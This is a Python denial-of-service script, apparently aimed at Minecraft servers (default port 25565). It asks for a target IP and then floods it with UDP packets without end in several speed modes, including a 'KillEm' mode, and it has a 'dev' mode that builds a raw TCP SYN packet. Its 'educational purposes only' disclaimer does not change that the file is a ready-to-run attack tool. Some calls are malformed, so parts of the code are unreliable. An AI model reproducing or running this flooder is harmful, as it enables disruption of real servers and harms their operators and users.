import socket
import threading
import requests

import time


print(
    """
        ######  #          #      ######   ######
        #       #         # #     #     #  #
        ######  #        #####    ######   ####
        #       #       #     #   #     #  #
        #       #####  #       #  #     #  #####
        V1.18.10

        +++++++++++++++
        +=============+
        +=============+
        +++++++++++++++
             +=+
             +=+
             +=+
             +=+
             +=+
            <+=+>
    
    
    
    
    
    
    
    
    """
)
print("Warning!!!! This Script is no joke and it is for educational purposes only, I'm not responsible for any damage caused by this script")
print("To insert the default port write 0")
#times = input("How Many Times Do You Want To Send Requests?(only works with the 'new' option, the options are 10, 500, 1000 and forever) >> ")
ip = input('IP >> ')
port = int(input('Port (Default: 25565) >> '))
#threads = input("How Many Threads (MAX OF 5, this only works with the 'new' option) >> ")

if port == 0:
      port = 25565

question = input("What Type of ddos do you want to do? Slow, Medium, Fast, KillEm? >> ")

if question.lower() == 'fast':
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ip, port))
        print("Packet Sent to", ip, " (Packet = Connection Packet)")
        s.connect((ip, port))
        print("Packet send to", ip, " (Packet = Connection Packet)")
        s.connect((ip, port))
        print("Packet send to", ip, "(Packer = Connection Packet)")
        i = 0
        if i < 10:
            s.send(b'\x019999')
            print("Packet Sent ", ip,"  (Packet = x01)")
            s.send(b'\x01099')
            print("Packet Sent to", ip, " (Packet = x01)")
elif question.lower() == 'medium':
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            time.sleep(0.01)
            s.connect((ip, port))
            print("Packet Sent to", ip, " (Packet = Connection Packet)")
            s.connect((ip, port))
            time.sleep(0.01)
            print("Packet send to", ip, " (Packet = Connection Packet)")
            time.sleep(0.1)
            s.connect((ip, port))
            print("Packet send to", ip, " (Packet = Connection Packet)")
            i = 0
            if i < 10:
                time.sleep(0.01)
                s.send(b'\x0119')
                print("Packet Sent to", ip, " (Packet = x01)")
                time.sleep(0.01)
                s.send(b'\x01')
                print("Packet Sent to", ip,"(Packet = x01)")
                s.connect((ip, port))
                s.send(b'\x02')
                s.connect((ip, port))
                s.connect(b'\x06')
                print("Packet Sent to", ip,"(Packet = x01)")
                s.connect((ip, port))
                s.send(b'\x05')
                s.connect((ip, port))
                s.send(b'\x07')
                s.connect((ip, port))
                print("Packet send to", ip, " (Packet = Connection Packet)")
elif question.lower() == 'slow':
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                time.sleep(0.5)
                s.connect((ip, port))
                print("Packet Sent to", ip, " (Packet = Connection Packet)")
                s.connect((ip, port))
                time.sleep(0.5)
                print("Packet send to", ip, " (Packet = Connection Packet)")
                i = 0
                if i < 10:
                    time.sleep(0.5)
                    s.send(b'\x011')
                    print("Packet Sent to", ip, " (Packet = data)")
                    time.sleep(0.5)
                    s.send(b'\x02')
                    print("Packet Sent to", ip,"(Packet = data)")
                    s.send(b'\x20')
                    s.connect((ip, port))
                    s.send(b'\x21')
                    print("Packet Sent to", ip,"(Packet = data)")
                    s.send(b'\x21')
                    time.sleep(0.5)
                    print("Packet Sent to", ip,"(Packet = data)")
                    s.send(b'\x21')
                    time.sleep(0.5)
                    print("Packet Sent to", ip,"(Packet = data)")
                    s.send(b'\x10')
                    print("Packet Sent to", ip,"(Packet = data)")



elif question.lower() == 'killem':
    print("ok!")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, port))
    print("Packet Sent to", ip, " (Packet = Connection Packet)")
    print("Charging Strike!")
    time.sleep(1)
    print("Attack Starting")
    while True:
        i = 0
        if i < 10:
            s.send(b'\x10')
            print("Packet Sent to", ip, " (Packet = x01)")
            s.connect((ip, port))
            s.send(b'\x01')
            print("Packet Sent to", ip, " (Packet = x01)")
            s.connect((ip, port))
            s.send(b'\x31')
            print("Packet Sent to", ip, " (Packet = x01)")
            s.send(b'\x05')
            print("Packet Sent to", ip, " (Packet = x01)")
            s.connect((ip, port))
            s.send(b'\x13')
            print("Packet Sent to", ip, " (Packet = x01)")
            s.connect((ip, port))
            s.send(b'\x02')
            print("Packet Sent to", ip, " (Packet = x01)")
            s.connect((ip, port))
            s.send(b'\x04')
            s.connect((ip, port))
            print("Packet Sent to", ip, " (Packet = x01)")
            s.send(b'\x07')
            print("Packet Sent to", ip, " (Packet = x01)")
            s.connect((ip, port))
            s.send(b'\x01')
            s.send(b'\x06')
            s.send(b'\x17')
            s.connect((ip, port))
            s.connect((ip, port))
            
elif question.lower() == 'dev':
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    s.connect((ip, port))
    print("Connection Successful")
    time.sleep(1)
    s.send(b'\x01')
    print("Requst Packet Successful")
    time.sleep(1)
    s.close((ip, port))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    ip_headers  = b'\x45\x00\x00\x28'  # Version, IHL, Type of Service | Total Length
    ip_headers += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
    ip_headers += b'\x40\x06\xa6\xec'  # TTL, Protocol | headers Checksum
    ip_headers += b'\x0a\x0a\x0a\x02'  # Source Address
    ip_headers += b'\x0a\x0a\x0a\x01'  # Destination Address

    tcp_headers  = b'\x30\x39\x00\x50' # Source Port | Destination Port
    tcp_headers += b'\x00\x00\x00\x00' # Sequence Number
    tcp_headers += b'\x00\x00\x00\x00' # Acknowledgement Number
    tcp_headers += b'\x50\x02\x71\x10' # Data Offset, Reserved, Flags | Window Size
    tcp_headers += b'\xe6\x32\x00\x00' # Checksum | Urgent Pointer

    packet = ip_headers + tcp_headers
    s.sendto(packet, ('10.10.10.1', 0))


